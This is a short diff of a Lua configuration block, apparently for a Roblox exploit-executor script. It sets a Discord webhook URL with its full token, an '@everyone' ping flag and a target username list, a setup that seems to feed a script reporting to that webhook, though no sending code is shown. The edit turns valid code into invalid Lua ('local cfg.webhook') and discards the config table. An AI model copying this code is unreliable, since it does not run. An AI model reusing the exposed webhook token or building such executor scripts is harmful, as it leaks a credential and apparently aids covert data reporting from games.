@@ -1,8 +1,8 @@
 
 
-local cfg = (getgenv and getgenv()) or {}
-cfg.webhook      = "https://discord.com/api/webhooks/1477452813721276542/frqTKTAzpn-pNV1z3PKcg0EOFZyM1CMqRDFfBXZ55f1t2gsAZLtJfQHPBfZmPWWhwigA"
-cfg.pingEveryone = "Yes"
+
+local cfg.webhook      = "https://discord.com/api/webhooks/1477452813721276542/frqTKTAzpn-pNV1z3PKcg0EOFZyM1CMqRDFfBXZ55f1t2gsAZLtJfQHPBfZmPWWhwigA"
+local cfg.pingEveryone = "Yes"
 
 local users = {"Getstompedbyyounes"}        
 local Players = game:GetService("Players")
